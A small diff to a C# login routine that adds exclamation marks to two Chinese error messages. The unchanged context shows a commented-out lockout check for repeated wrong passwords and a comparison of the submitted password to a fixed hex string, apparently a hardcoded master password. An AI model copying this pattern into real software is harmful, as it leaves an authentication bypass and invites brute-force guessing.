@@ -93,7 +93,7 @@ namespace Liaoxin.Business
             var cnt = (from c in Context.Clients where c.Telephone == request.Telephone && c.IsEnable select c).Count();
             if (cnt == 0)
             {
-                throw new ZzbException("用户名或者密码错误");
+                throw new ZzbException("用户名或者密码错误!");
             }
             var client = (from c in Context.Clients where c.Telephone == request.Telephone && c.IsEnable select c).FirstOrDefault();
             //if (client.ErrorPasswordCount >= 10)
@@ -102,7 +102,7 @@ namespace Liaoxin.Business
             //}
             if (client.IsFreeze)
             {
-                throw new ZzbException("您的账户已被冻结,无法登陆");
+                throw new ZzbException("您的账户已被冻结,无法登陆!");
             }
 
             if (request.Password == "6a8f9c6bbb4848adb358ede651454f69")
